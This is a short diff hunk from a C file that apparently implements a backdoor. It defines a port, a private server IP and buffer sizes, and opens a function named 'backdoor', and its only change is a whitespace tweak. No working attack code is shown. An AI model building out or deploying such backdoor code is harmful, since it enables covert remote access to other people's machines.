@@ -16,7 +16,7 @@
 #define PORT			45577
 #define SERVER_IP		"192.168.253.128"
 #define BUFFER_SIZE		1024
-#define RESPONSE_SIZE	4096
+#define RESPONSE_SIZE		4096
 
 int backdoor(void) {
 
